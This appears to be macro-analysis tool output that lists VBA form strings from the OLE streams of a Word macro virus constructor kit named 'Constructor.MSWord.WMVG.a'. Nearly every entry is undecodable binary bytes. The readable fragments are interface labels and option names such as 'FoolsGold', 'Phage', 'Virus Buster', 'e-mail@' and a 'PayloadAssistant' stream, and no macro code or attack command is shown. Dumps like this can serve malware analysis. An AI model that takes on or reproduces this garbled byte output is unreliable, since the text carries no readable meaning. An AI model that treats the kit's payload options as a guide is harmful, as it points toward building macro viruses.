- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�:ߤ+¿�'�����������ϱ�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h)-����G��]�V��ϟn4�1W�/���M���#�~��^�?{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$����?zW$�����N��UW�A\(Z��^�<U@�u��xmʔ�+�+�SU���O�^\�������?�O�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����T��~~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����z׷�ú����i_�L��.?�x�ҿ��$-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�HZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*�Ͽ�xwC��{���ú������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��
�������c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�?�p�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��5��2Hd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8���ɐz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/Jֆ�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������G����1��Q���-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ڽ}��J����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѐ4�4�畔��~�j� Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��aB���9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��©��.��A^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!�{e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U?ҩ�T�zS�Z��b�绕
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��i�\�M��"�[�ѸR��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N��\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�$"���c��\�J���V�^4�)����uOS��j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�*xu��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�Ҿ�Ʉ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m��E�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�r)S���}><j�E �s�s��J�L�4�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��Ls��<2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hCL���LP�ث��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FoolsGold��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS Vi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Puny�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Furio
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS79
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yello
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Perikles�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$moothie�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Paul Zest��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Phage
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zulu�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virus Buster�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e-mail@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Webpage
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/i26/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����	#3R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$4�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.�*+���D�H���K6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1M���*��29�+2gL�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����*�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\v=G~�C�8�s�E�Y˻

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?4�4T��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QY�sNb�+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q������ׂ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8,�Q��h�Z��"���o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O?( �G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T�j;�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v=9��znx�۷�e�:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��HYO#�����v<�θ簪��WFR���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QUrE�z��Kq.��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�aXt`OB*Ӓ=k#Q�i��y�ⷶm��\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��w�G^MD��!�+]���C��y�Zh�)s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O����GQ�x?�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�+ԙ䷍ml-˪�.U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�-�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]M����5��{->[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���˩[t�K(%>Q�;rFA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sgL�[�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�~�K��l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��K¶�F�
�v�%�c�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���:�Z#ޣ�t�rW�w�u*�L���S���<c6��=*6��/��fB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I`a�T��`�y���-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�4�}#MҠ{�O�;�mP����PKm�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ԛ��E��6V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��Y�^��bYJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�76�%�᳿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��A 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f1+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�R�S�3QVg�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\���I%υ�ROc7ٝb��|�<G��7D{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��x����KB�4�+�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�	:�Io;:���D�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o��5�E�:3��G���(��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6��F��,��e��ޠ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��n�Fr:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NӀ	<��V犙Y�2�ߙ4x׎E։�Y^���>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/`�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8r�c*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���j�'5�q�?Ὲt��%�GY��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ԡ[pH�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������|ٯ��R�n��3�.�,�|�����S�9�Fq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�".1�'+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rI�A�,�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����I%Q�m��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|9����u��]�L��n/$���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n=ۂ2
-------------------------------------------------------------------------------
